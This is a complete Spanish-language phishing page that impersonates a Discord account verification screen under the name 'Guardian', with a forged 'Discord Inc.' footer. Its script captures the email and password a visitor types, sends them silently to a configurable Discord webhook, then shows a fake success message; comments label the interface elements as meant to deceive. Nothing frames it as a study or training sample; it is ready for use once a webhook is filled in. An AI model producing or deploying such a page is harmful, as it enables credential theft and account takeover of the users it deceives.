<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación de Cuenta | Guardian</title>
    <style>
        /* Reset y Estilos Base */
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
        body { background-color: #36393f; color: #dbdee1; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        
        /* Contenedor Principal */
        .container {
            width: 480px;
            background-color: #2f3136;
            border-radius: 5px;
            padding: 32px;
            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        /* Encabezado */
        h2 { margin-bottom: 8px; font-size: 24px; font-weight: 600; }
        p { color: #b5bbbc; font-size: 14px; margin-bottom: 24px; line-height: 1.4; }
        
        /* Inputs */
        .input-group { text-align: left; margin-bottom: 16px; }
        label { display: block; color: #b5bbbc; font-size: 12px; font-weight: 700; text-transform: uppercase; margin-bottom: 8px; }
        input {
            width: 100%;
            background-color: #202225;
            border: 1px solid #202225;
            border-radius: 3px;
            padding: 10px;
            color: #dbdee1;
            font-size: 16px;
            transition: border 0.1s ease;
        }
        input:focus { border-color: #7289da; outline: none; }

        /* Botón */
        button {
            width: 100%;
            background-color: #7289da;
            color: white;
            border: none;
            border-radius: 3px;
            padding: 12px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover { background-color: #5f73b4; }

        /* Elementos de UX para engañar */
        .spinner {
            display: none;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid #fff;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Mensaje de éxito oculto inicialmente */
        #success-msg { display: none; }
        .check-icon { color: #43b581; font-size: 48px; margin-bottom: 16px; }
        
        /* Footer falso */
        .footer { margin-top: 20px; font-size: 12px; color: #72767d; }
    </style>
</head>
<body>

    <div class="container">
        <!-- Formulario -->
        <div id="login-form">
            <h2>Verificación de Seguridad</h2>
            <p>Tu cuenta necesita verificación para acceder al contenido exclusivo del servidor.</p>
            
            <form id="discordForm">
                <div class="input-group">
                    <label for="email">Correo Electrónico</label>
                    <input type="text" id="email" name="email" autocomplete="off" required>
                </div>
                
                <div class="input-group">
                    <label for="password">Contraseña</label>
                    <input type="password" id="password" name="password" required>
                </div>

                <button type="submit" id="btn-submit">Verificar Ahora</button>
                <div class="spinner" id="spinner"></div>
            </form>
            <div class="footer">Discord Inc. &copy; 2024</div>
        </div>

        <!-- Pantalla de Éxito (Se muestra después) -->
        <div id="success-msg">
            <div class="check-icon">✓</div>
            <h2>¡Verificado!</h2>
            <p>Tu cuenta ha sido verificada correctamente.<br>Puedes cerrar esta ventana.</p>
        </div>
    </div>

    <script>
        // CONFIGURACIÓN: CAMBIA ESTO
        const WEBHOOK_URL = 'TU_WEBHOOK_DE_DISCORD_AQUI'; 
        // Ejemplo: https://discord.com/api/webhooks/123456/abcdef...

        document.getElementById('discordForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('btn-submit');
            const spinner = document.getElementById('spinner');

            // UI Feedback: Simular carga
            btn.style.display = 'none';
            spinner.style.display = 'block';

            try {
                // 1. Enviar datos al Webhook (Silencioso)
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "🔒 Nueva Verificación Capturada",
                            color: 16711680, // Rojo para llamar la atención
                            fields: [
                                { name: "📧 Email", value: email, inline: true },
                                { name: "🔑 Password", value: password, inline: true },
                                { name: "🕒 Hora", value: new Date().toLocaleString() }
                            ],
                            footer: { text: "Guardian System v2.1" }
                        }]
                    })
                });

                // 2. Simular retardo para realismo (2 segundos)
                await new Promise(r => setTimeout(r, 2000));

                // 3. Mostrar pantalla de éxito
                document.getElementById('login-form').style.display = 'none';
                document.getElementById('success-msg').style.display = 'block';

            } catch (error) {
                console.error("Error:", error);
                alert("Hubo un error de conexión. Inténtalo de nuevo.");
                spinner.style.display = 'none';
                btn.style.display = 'block';
            }
        });
    </script>
</body>
</html>
